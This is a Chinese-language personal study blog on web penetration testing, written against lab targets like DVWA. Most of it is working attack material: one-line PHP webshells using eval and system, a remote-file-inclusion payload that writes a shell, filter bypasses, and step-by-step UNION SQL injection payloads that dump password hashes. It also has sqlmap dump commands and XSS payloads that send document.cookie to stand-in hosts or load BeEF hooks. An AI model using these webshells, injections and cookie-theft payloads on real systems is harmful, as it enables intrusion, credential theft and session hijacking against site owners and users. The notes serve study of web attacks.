---
title: Web Security Collected
date: 2019-07-18 19:18:03
tags: [Web]
categories: [Network Security]
---

Web 攻防学习

本文的主要内容是，个人在学习千峰Linux，Web安全渗透教程时的一些记录


## 工具

### 浏览器插件

1. X-Forwarded-For Injector

   可以实现伪造XFF头绕过服务器IP过滤

   This extension allows you quickly to set the X-Forwarded-For HTTP Header

2. New Hackbar

---

## 知识

### 文件上传漏洞原理
查找系统是否存在一句话木马：
```sh
fgrep -R '<?php @eval($_POST['
```

#### Webshell
小马：一句话木马也称小马，即整个shell代码量只有一行，一般是系统执行函数  
大马：代码量和功能比小马多，一般会进行二次编码加密，防止被防火墙和入侵检测系统检测到

```php
shell2.php  #eval 使用php函数，例如phpinfo()
<?php eval($_REQUEST['cmd']); ?>

http://x.x.x.x/dvwa/hackable/uploads/shell2.php?cmd=phpinfo();
```

```php
shell3.php  #system 使用Linux系统命令，例如ls, cp, rm
<?php system($_REQUEST['yangge']);?>

http://x.x.x.x/dvwa/hackable/uploads/shell3.php?yangge=cat /etc/passwd
```

#### 中国菜刀
```php
<?php @eval($_POST['chopper']); ?>

#说明：REQUEST是在网页端输入变量访问，POST则是使用像中国菜刀之类的工具连接，是C/S架构
```


### 文件包含(File Inclusion)漏洞原理
指当服务器开启`allow_url_include`选项时，就可以通过php的某些特性函数(include()、require()和include_once()、require_once() )利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或任意命令执行。分为本地文件包含漏洞和远程文件包含漏洞。远程文件包含漏洞是因为开启了php配置中的`allow_url_fopen`选项（开启后服务器允许包含一个远程的文件），而攻击者可以构造这个恶意文件来达到自己的目的。

#### 本地文件包含  
```php
http://x.x.x.x/dvwa/fi/index.php?page=/etc/passwd
```

或者，使用edjpgcom.exe工具制作图片一句话木马，
```php
<?fputs(fopen("shell1.php","w"),'<?php @eval($_POST[caidao]);?>')?>
```

这样会生成shell1.php，使用菜刀可以连接


#### 远程文件包含

在本地架设网站，然后新建1.txt文件，写入一句话木马，在有漏洞的网站中访问即可生成shell1.php，使用菜刀连接
例如：kali
```
systemctl start apache2
vim /var/www/html/1.txt
```

```php
http://x.x.x.x/dvwa/fi/index.php?page=http://remote.com/1.txt

#1.txt
<?fputs(fopen("shell1.php","w"),'<?php @eval($_POST[caidao]);?>')?>
```

针对str_replace()绕过，使用`hhttp://ttp://`类似的方法

```php
// Bad input validation 
$file = str_replace("http://", "", $file); 
$file = str_replace("https://", "", $file); 
```


---

### SQL注入攻击
SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致的过滤用户输入的数据，致使非法数据侵入系统。

#### 使用or
```sql
mysql> select user_id, first_name, last_name from dvwa.users where user_id=7;
Empty set (0.00 sec)

mysql> select user_id, first_name, last_name from dvwa.users where user_id=7 or 1=1;
+---------+------------+-----------+
| user_id | first_name | last_name |
+---------+------------+-----------+
|       1 | admin      | admin     |
|       2 | Gordon     | Brown     |
|       3 | Hack       | Me        |
|       4 | Pablo      | Picasso   |
|       5 | Bob        | Smith     |
|       6 | user       | user      |
+---------+------------+-----------+
6 rows in set (0.00 sec)

```

```php
<?php     

if(isset($_GET['Submit'])){ 
     
    // Retrieve data 
     
    $id = $_GET['id']; 

    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"; 
    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' ); 

    $num = mysql_numrows($result); 

    $i = 0; 

    while ($i < $num) { 

        $first = mysql_result($result,$i,"first_name"); 
        $last = mysql_result($result,$i,"last_name"); 
         
        echo '<pre>'; 
        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
        echo '</pre>'; 

        $i++; 
    } 
} 
?>
```
对于上面的查询可以使用如下参数 `' or 1=1 -- ddddd`  或者`12' or 1=1 -- ddd`来获取本表的其它内容



#### 使用union
如果要获取其它表的数据，需要使用union。  

请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。

如果我们不知道前面的select列的数目怎么办？使用数字，数字可以充当任何字段

```sql

mysql> select user,password,host from mysql.user union select user_login, user_pass from wordpress.wp_users;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
mysql> select user,password,host from mysql.user union select user_login, user_pass,1 from wordpress.wp_users;
+------------------+-------------------------------------------+---------------+
| user             | password                                  | host          |
+------------------+-------------------------------------------+---------------+
| debian-sys-maint | *75F15FF5C9F06A7221FEB017724554294E40A327 | localhost     |
| phpmyadmin       | *D5D9F81F5542DE067FFF5FF7A4CA4BDD322C578F | localhost     |
| vicnum           | *C7847100CDBE29050A338F78EA71F066D196ED98 | localhost     |
| wordpress        | *C260A4F79FA905AF65142FFE0B9A14FE0E1519CC | %             |
| phpbb            | *CA1F8B079BB2857835107EA008871B4691769547 | %             |
| dvwa             | *D67B38CDCD1A55623ED5F55856A29B9654FF823D | %             |
| admin            | 21232f297a57a5a743894a0e4a801fc3          | 1             |
| user             | ee11cbb19052e40b07aac0ca060c23ee          | 1             |
+------------------+-------------------------------------------+---------------+
40 rows in set (0.00 sec)

```

即，我们可以猜字段数。
```sql
select * from dvwa.users union select 1;
select * from dvwa.users union select 1,2;
select * from dvwa.users union select 1,2,3;
select * from dvwa.users union select 1,2,3,4;
select * from dvwa.users union select 1,2,3,4,5;
```


如果我们只想要union后面表的数据，可以如下：
```sql
mysql> select user,password,host from mysql.user where 1=2 union select user_login, user_pass,1 from wordpress.wp_users;
+-------+----------------------------------+------+
| user  | password                         | host |
+-------+----------------------------------+------+
| admin | 21232f297a57a5a743894a0e4a801fc3 | 1    |
| user  | ee11cbb19052e40b07aac0ca060c23ee | 1    |
+-------+----------------------------------+------+
2 rows in set (0.00 sec)

```

#### information_schema
数据库字典，保存数据库表、字段等信息

先看两个语句：
```sql
mysql> select * from information_schema.tables \G;
*************************** 1. row ***************************
  TABLE_CATALOG: NULL
   TABLE_SCHEMA: information_schema
     TABLE_NAME: CHARACTER_SETS
     TABLE_TYPE: SYSTEM VIEW
         ENGINE: MEMORY
        VERSION: 10
     ROW_FORMAT: Fixed
     TABLE_ROWS: NULL
 AVG_ROW_LENGTH: 384
    DATA_LENGTH: 0
MAX_DATA_LENGTH: 16604160
   INDEX_LENGTH: 0
      DATA_FREE: 0
 AUTO_INCREMENT: NULL
    CREATE_TIME: NULL
    UPDATE_TIME: NULL
     CHECK_TIME: NULL
TABLE_COLLATION: utf8_general_ci
       CHECKSUM: NULL
 CREATE_OPTIONS: max_rows=43690
  TABLE_COMMENT:
*************************** 2. row ***************************
  TABLE_CATALOG: NULL
   TABLE_SCHEMA: information_schema
     TABLE_NAME: COLLATIONS
     TABLE_TYPE: SYSTEM VIEW
         ENGINE: MEMORY
        VERSION: 10
     ROW_FORMAT: Fixed
     TABLE_ROWS: NULL
 AVG_ROW_LENGTH: 231
    DATA_LENGTH: 0
MAX_DATA_LENGTH: 16704765
   INDEX_LENGTH: 0
      DATA_FREE: 0
 AUTO_INCREMENT: NULL
    CREATE_TIME: NULL
    UPDATE_TIME: NULL
     CHECK_TIME: NULL
TABLE_COLLATION: utf8_general_ci
       CHECKSUM: NULL
 CREATE_OPTIONS: max_rows=72628
  TABLE_COMMENT:
*************************** 3. row ***************************

```


```sql
mysql> select DISTINCT TABLE_SCHEMA from information_schema.tables; --等价于show databases;
+--------------------+
| TABLE_SCHEMA       |
+--------------------+
| information_schema |
| bricks             |
| bwapp              |
| citizens           |
| cryptomg           |
| dvwa               |
| gallery2           |
| getboo             |
| ghost              |
| gtd-php            |
| hex                |
| isp                |
| joomla             |
| mutillidae         |
| mysql              |
| nowasp             |
| orangehrm          |
| personalblog       |
| peruggia           |
| phpbb              |
| phpmyadmin         |
| proxy              |
| rentnet            |
| sqlol              |
| tikiwiki           |
| vicnum             |
| wackopicko         |
| wavsepdb           |
| webcal             |
| webgoat_coins      |
| wordpress          |
| wraithlogin        |
| yazd               |
+--------------------+
33 rows in set (0.00 sec)

```

查询库名，表名
```sql
mysql> select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='dvwa';
+--------------+------------+
| TABLE_SCHEMA | TABLE_NAME |
+--------------+------------+
| dvwa         | guestbook  |
| dvwa         | users      |
+--------------+------------+
2 rows in set (0.00 sec)
```

查询数据库名、表名、字段名 information_schema.columns
```sql
mysql> select * from information_schema.columns limit 3 \G;
*************************** 1. row ***************************
           TABLE_CATALOG: NULL
            TABLE_SCHEMA: information_schema
              TABLE_NAME: CHARACTER_SETS
             COLUMN_NAME: CHARACTER_SET_NAME
        ORDINAL_POSITION: 1
          COLUMN_DEFAULT:
             IS_NULLABLE: NO
               DATA_TYPE: varchar
CHARACTER_MAXIMUM_LENGTH: 32
  CHARACTER_OCTET_LENGTH: 96
       NUMERIC_PRECISION: NULL
           NUMERIC_SCALE: NULL
      CHARACTER_SET_NAME: utf8
          COLLATION_NAME: utf8_general_ci
             COLUMN_TYPE: varchar(32)
              COLUMN_KEY:
                   EXTRA:
              PRIVILEGES: select
          COLUMN_COMMENT:
*************************** 2. row ***************************
           TABLE_CATALOG: NULL
            TABLE_SCHEMA: information_schema
              TABLE_NAME: CHARACTER_SETS
             COLUMN_NAME: DEFAULT_COLLATE_NAME
        ORDINAL_POSITION: 2
          COLUMN_DEFAULT:
             IS_NULLABLE: NO
               DATA_TYPE: varchar
CHARACTER_MAXIMUM_LENGTH: 32
  CHARACTER_OCTET_LENGTH: 96
       NUMERIC_PRECISION: NULL
           NUMERIC_SCALE: NULL
      CHARACTER_SET_NAME: utf8
          COLLATION_NAME: utf8_general_ci
             COLUMN_TYPE: varchar(32)
              COLUMN_KEY:
                   EXTRA:
              PRIVILEGES: select
          COLUMN_COMMENT:
*************************** 3. row ***************************
```

```sql
mysql> select column_name from information_schema.columns where table_schema='dvwa';
+-------------+
| column_name |
+-------------+
| comment_id  |
| comment     |
| name        |
| user_id     |
| first_name  |
| last_name   |
| user        |
| password    |
| avatar      |
+-------------+
9 rows in set (0.00 sec)
```

#### SQL注入流程
1. 判断是否存在SQL注入漏洞；
2. 判断操作系统、数据库和Web应用类型；
3. 获取数据库信息，包括管理员信息，然后拖库；
4. 加密信息破解，sqlmap可自动破解；
5. 权限提升，获得sql-shell、os-shell、登录应用后台；

#### 手动注入
1. 基于错误的注入  
根据错误返回来判断是否有注入点

2. 基于布尔的注入  

3. 基于union的注入  

猜列数
```sql
' union select 1 -- ddd
' union select 1,2 -- ddd
' union select 1,2,3 -- ddd
' union select 1,2,3,4 -- ddd
```

获取当前数据库及用户信息  
```sql
' union select version(), database() -- ddd'
' union select user(), database() -- ddd'
```

查看数据库名
```sql
' union select TABLE_SCHEMA, 1 from information_schema.tables -- ddd'
```

查看数据库表名和对应数据库名
```sql
' union select TABLE_SCHEMA, TABLE_NAME from information_schema.tables -- ddd'
```

查看数据表
```sql
' union select 1, column_name from information_schema.columns where table_name='users' -- ddd'
```

使用concat输出所有数据
```sql
' union select user, password from users -- ddd'
' union select password, concat(first_name, ' ', last_name, ' ', user) from users -- ddd'
-- 输出如下：
-- ID: ' union select password, concat(first_name, ' ', last_name, ' ', user) from users -- ddd'
-- First name: 21232f297a57a5a743894a0e4a801fc3
-- Surname: admin admin admin
```

4. 基于时间的盲注
有些数据库对错误信息进行了安全配置，使得无法通过以上方式探测到注入点，此时，通过设置sleep语句来探测注入点。

```php
<?php
if (isset($_GET['Submit'])) {     
    // Retrieve data     
    $id = $_GET['id']; 

    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"; 
    $result = mysql_query($getid); // Removed 'or die' to suppres mysql errors 

    $num = @mysql_numrows($result); // The '@' character suppresses errors making the injection 'blind' 

    $i = 0; 
    while ($i < $num) { 
        $first = mysql_result($result,$i,"first_name"); 
        $last = mysql_result($result,$i,"last_name"); 
         
        echo '<pre>'; 
        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last; 
        echo '</pre>'; 

        $i++; 
    } 
} 
?>
```

使用`1' and sleep(5) -- ddd`来探测，此处1要为真语句


### sqlmap自动化注入

#### GET方法注入

```
1. 获得当前数据库
sqlmap -u "x.x.x.x" --batch --current-db

2. 获得数据库表
sqlmap -u "x.x.x.x" -D dbs_name --tables

3. 获得表字段
sqlmap -u "x.x.x.x" -D dbs_name -T table_name --columns

4. 获得表中数据
sqlmap -u "x.x.x.x" -D dbs_name -T table_name -C "username, password" --dump
```


#### POST方式注入

```
COOKIE
sqlmap -u "x.x.x.x" --cookie="sdf;sdf"

```


-----

## XSS 跨站脚本攻击
Cross Site Scripting
XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

**XSS脚本**

```
弹框警告
一般作为漏洞测试或者演示使用，类似SQL注入漏洞中的单引号，一旦脚本能执行，也就意味着后端服务器没有对特殊字符进行过滤<>/，这样可以证明，这个页面位置存在XSS漏洞。
<script>alert('xss')</script>
<script>alert(document.cookie)</script>

页面嵌套
<iframe src=http://www.baidu.com width=300 height=300></iframe>
<iframe src=http://www.baidu.com width=0 height=0 border=0></iframe>

页面重定向
<script>window.location="http://www.baidu.com"</script>
<script>location.href="http://www.baidu.com"</script>

弹框警告并重定向
<script>alert("请前往新站");location.href("http://www.baidu.com")</script>

访问恶意代码
<script src="http://www.baidu.com/xss.js"></script>
<script src="http://BeEF_IP:3000/hook.js"></script>  #结合BeEF收集用户的cookie

巧用图片标签
<img src="#" onerror=alert("xss")>
<img src="javascript:alert('xss');">
<img src="http://BeEF:3000/hook.js"></img>

绕开过滤的脚本
大小写 <ScrIpt>alert('xss')</SCRipt>
字符编码 采用URL、Base64等编码

收集用户cookie
打开新窗口并且采用本地cookie访问目标网页
<script>window.open("http://www.baidu.com/cookie.php?cookie="+document.cookie)</script>
<script>document.location="http://www.xxx.com/cookie.jsp?cookie="+document.cookie</script>
<script>new Image().src="http://www.xxx.com/cookie.php?cookie="+document.cookie;</script>
<img src="http://www.xxx.com/cookie.php?cookie='+document.cookie'"></img>
```

### 反射型 XSS reflected
如上


### 存储型 XSS stored
危害更大

### 自动化XSS
Browser Exploitation Framework(BeEF)  
BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透；Ruby语音编写，支持图形化界面

信息收集： 网络发现 主机信息 Cookie获取  会话劫持  键盘记录 插件信息  
持久化控制： 确认弹框  小窗口  中间人  
社会工程： 点击劫持  弹框告警  虚假页面  钓鱼页面  

```bash
service start apache2

```

命令颜色
```
绿色：对目标主机生效且不可见（不会被发现）
橙色：对目标主机生效但可能可见（可能被发现）
灰色：对目标主机未必生效（可以验证）
红色：对目标主机不生效
```


## Web信息收集

inurl:  
```
inurl:.php?id=
inurl:view.php=?
inurl:.jsp?id=
inurl:.asp?id=
inurl:/admin/login.php
inurl:login
```

intitle:  
```
intitle:后台管理
intitle:后台管理 filetype:php
intitle:index of "keyword"
intitle:index of "password"
intitle:index of "parent directory"
```

intext:  
```
intext:Powered by Discuz
intext:Powered by wordpress
intext:Powered by *CMS
```



